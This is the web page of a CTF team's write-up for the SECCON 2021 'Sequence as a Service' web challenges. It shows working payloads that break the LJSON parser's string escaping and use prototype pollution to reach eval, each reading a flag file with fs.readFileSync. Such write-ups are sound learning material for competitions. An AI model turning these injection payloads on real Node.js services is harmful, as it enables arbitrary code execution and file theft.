@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Sequence as a Service | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Sequence as a Service" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/SECCON-2021/web/sequence_as_a_service.html" />
+<meta property="og:url" content="https://org.anize.rs/SECCON-2021/web/sequence_as_a_service.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Sequence as a Service" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Sequence as a Service","url":"https://org.anize.rs/SECCON-2021/web/sequence_as_a_service.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="sequence-as-a-service">Sequence as a Service</h2>
+
+<p><strong>Authors</strong>: <a href="https://twitter.com/bazumo">bazumo</a>, solved together with <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags</strong>: web</p>
+
+<p><strong>Points</strong>: 205 (20 solves)</p>
+
+<blockquote>
+  <p>I’ve heard that SaaS is very popular these days. So, I developed it, too.
+Note: It is possible to solve SaaS 2 even if you don’t solve SaaS 1.</p>
+</blockquote>
+
+<p>This challenge had two parts, we solved the second one first and then found a likely unintended solution for both parts.</p>
+
+<p>In this challenge, we were given the source of a web application. In short, on the website we could select a sequence (i.e factorial numbers) and get the n’th number of the sequence. The sequence was described in LJSON and the stringified version of it was sent together with n to the server.</p>
+
+<h3 id="ljson">LJSON</h3>
+
+<p>LJSON is a language that tries to extend JSON to support pure functions.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">// The object that provides the functions that we can use in LJSON</span>
+<span class="kd">const</span> <span class="nx">lib</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="dl">"</span><span class="s2">+</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">x</span> <span class="o">+</span> <span class="nx">y</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">x</span> <span class="o">-</span> <span class="nx">y</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">x</span> <span class="o">*</span> <span class="nx">y</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">x</span> <span class="o">/</span> <span class="nx">y</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">),</span>
+  <span class="dl">"</span><span class="s2">for</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">r</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">f</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">map</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">map</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">map</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">:</span> <span class="p">(</span><span class="nx">map</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">typeof</span> <span class="nx">i</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="p">?</span> <span class="nx">map</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">:</span> <span class="kc">null</span><span class="p">;</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">self</span><span class="dl">"</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">lib</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="c1">// LJSON can be stringified like this, unlike JSON is supports lamda functions. </span>
+<span class="kd">const</span> <span class="nx">src</span> <span class="o">=</span> <span class="nx">LJSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">((</span><span class="nx">$</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="o">=&gt;</span>
+  <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">,</span>
+    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">,</span>
+      <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">set</span><span class="dl">"</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">self</span><span class="dl">"</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+      <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">for</span><span class="dl">"</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="nx">n</span><span class="p">,</span>
+        <span class="nx">i</span> <span class="o">=&gt;</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">set</span><span class="dl">"</span><span class="p">,</span>
+          <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">self</span><span class="dl">"</span><span class="p">),</span>
+          <span class="mi">0</span><span class="p">,</span>
+          <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">self</span><span class="dl">"</span><span class="p">),</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">2</span><span class="p">),</span>
+        <span class="p">),</span>
+      <span class="p">),</span>
+    <span class="p">),</span>
+    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">,</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">self</span><span class="dl">"</span><span class="p">),</span> <span class="mi">0</span><span class="p">),</span>
+  <span class="p">),</span>
+<span class="p">);</span>
+
+<span class="c1">// src == "(a,b)=&gt;(a(\",\",a(\",\",a(\"set\",a(\"self\"),0,1),a(\"for\",0,b,(c)=&gt;(a(\"set\",a(\"self\"),0,a(\"*\",a(\"get\",a(\"self\"),0),2))))),a(\"get\",a(\"self\"),0)))"</span>
+
+
+<span class="c1">// The server would spawn a new node process and run our provided LJSON with the lib and our n.</span>
+<span class="nx">LJSON</span><span class="p">.</span><span class="nx">parseWithLib</span><span class="p">(</span><span class="nx">lib</span><span class="p">,</span> <span class="nx">src</span><span class="p">)(</span><span class="nx">n</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>LJSON works by creating javascript code from the src that then gets executed via eval with lib as an argument.</p>
+
+<p>Diffing the two challenges, we concluded that the solution must include the <code class="language-plaintext highlighter-rouge">self</code> function of lib as it was absent in the second part.</p>
+
+<p>After trying different things and accidentally solving part 2 we started to question wether we shouldn’t try to exploit the parser instead, which would solve both challenges and was probably not intended. Looking at the flag submission times of the other teams, there seemed to be quite a few who solved both challenges around the same time, indicating that their exploit targeted the parser.</p>
+
+<p>After playing around with <code class="language-plaintext highlighter-rouge">"</code> and <code class="language-plaintext highlighter-rouge">\</code> characters, we quickly found that the parser didn’t handle strings correctly and it was possible to eval whatever we wanted.</p>
+
+<p>Our final payload was:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://sequence-as-a-service-1.quals.seccon.jp:3000/api/getValue'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'sequence'</span><span class="p">:</span> <span class="s">"""(a,b)=&gt;(a("set",{},"asd","</span><span class="se">\\\\\\</span><span class="s">"), fs = require('fs'), text = fs.readFileSync('/flag.txt','utf8'), text})) //"))"""</span><span class="p">,</span>
+    <span class="s">'n'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+<span class="p">})</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">SECCON{45deg_P4sc4l_g3Ner4tes_Fib0n4CCi_5eq!}</code></p>
+
+<h3 id="sequence-as-a-service-2">Sequence as a Service 2</h3>
+
+<p>SaaS 2 could be solved the same way, but we likely found the intended solution first. The code was almost identical to 1, except for <code class="language-plaintext highlighter-rouge">self</code> being gone and parsing and evaling 2 sequences instead of one.</p>
+
+<p>The exploit goes as follows:</p>
+
+<p>In the first sequence:</p>
+<ol>
+  <li>get <code class="language-plaintext highlighter-rouge">__proto__</code> of lib by using set (setting <code class="language-plaintext highlighter-rouge">__proto__</code> doesn’t actually set it)</li>
+  <li>set <code class="language-plaintext highlighter-rouge">eval</code> of <code class="language-plaintext highlighter-rouge">lib.__proto__</code> to the number that <a href="https://github.com/MaiaVictor/LJSON/blob/master/LJSON.js#L397"><code class="language-plaintext highlighter-rouge">toName</code> </a> would convert to <code class="language-plaintext highlighter-rouge">eval</code> again.</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(a,b)=&gt;(a(",",a("get",{},"eval"),a("set",a("set",{},"__proto__","asdf"),"eval",193886)))
+</code></pre></div></div>
+
+<p>In the second squence:</p>
+<ol>
+  <li>use <code class="language-plaintext highlighter-rouge">eval</code> to execute code, the parser will allow it because it thinks <code class="language-plaintext highlighter-rouge">eval</code> is in the scope now because of the prototype pollution.</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eval("let s = function(s){const fs = require('fs'); var text = fs.readFileSync('flag.txt','utf8'); return text }; s;")
+</code></pre></div></div>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">SECCON{45deg_P4sc4l_g3Ner4tes_Fib0n4CCi_5eq!}</code></p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>We thought the challenges was quite cool. Javascript is fun!</p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
